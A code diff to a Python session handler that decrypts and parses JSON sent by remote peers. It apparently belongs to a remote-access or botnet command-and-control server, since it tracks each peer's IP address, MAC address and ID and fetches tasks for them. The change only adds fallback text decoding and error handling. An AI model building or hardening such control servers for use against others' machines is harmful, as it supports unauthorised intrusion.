@@ -985,18 +985,39 @@ class Session(threading.Thread):
             msg_size = struct.unpack("!L", header)[0]
             msg = self.connection.recv(msg_size)
             data = security.decrypt_aes(msg, self.key)
+            
+            # Try different decodings with error handling
             if isinstance(data, bytes):
-                data = data.decode('utf-8')
-            info = json.loads(data)
-            for key, val in list(info.items()):
-                if str(val).startswith("_b64"):
-                    info[key] = base64.b64decode(str(val[6:])).decode('utf-8')
-            return info
+                try:
+                    data = data.decode('utf-8')
+                except UnicodeDecodeError:
+                    try:
+                        # Try with errors='replace' to substitute invalid chars
+                        data = data.decode('utf-8', errors='replace')
+                    except:
+                        # Last resort - use latin-1 which can decode any byte
+                        data = data.decode('latin-1')
+            
+            # Parse JSON data
+            try:
+                info = json.loads(data)
+                for key, val in list(info.items()):
+                    if str(val).startswith("_b64"):
+                        try:
+                            info[key] = base64.b64decode(str(val[6:])).decode('utf-8')
+                        except UnicodeDecodeError:
+                            info[key] = base64.b64decode(str(val[6:])).decode('latin-1')
+                return info
+            except json.JSONDecodeError:
+                print(f"JSON decode error. Received data: {data[:100]}...")
+                return {"public_ip": "unknown", "mac_address": "unknown", "uid": os.urandom(16).hex()}
+                
         except Exception as e:
             import traceback
             print(f"Session init exception: {str(e)}")
             traceback.print_exc()
-            return {}
+            # Return minimal info to prevent KeyError
+            return {"public_ip": "unknown", "mac_address": "unknown", "uid": os.urandom(16).hex()}
 
     def status(self):
         """
@@ -1061,9 +1082,25 @@ class Session(threading.Thread):
                 msg_size = struct.unpack('!L', header)[0]
                 msg = self.connection.recv(msg_size)
                 data = security.decrypt_aes(msg, self.key)
+                
+                # Try different decodings with error handling
                 if isinstance(data, bytes):
-                    data = data.decode('utf-8')
-                return json.loads(data)
+                    try:
+                        data = data.decode('utf-8')
+                    except UnicodeDecodeError:
+                        try:
+                            # Try with errors='replace' to substitute invalid chars
+                            data = data.decode('utf-8', errors='replace')
+                        except:
+                            # Last resort - use latin-1 which can decode any byte
+                            data = data.decode('latin-1')
+                
+                # Parse JSON data
+                try:
+                    return json.loads(data)
+                except json.JSONDecodeError:
+                    print(f"JSON decode error in recv_task. Received data: {data[:100]}...")
+                    return 0
             else:
                 # empty header; peer down, scan or recon. Drop.
                 return 0
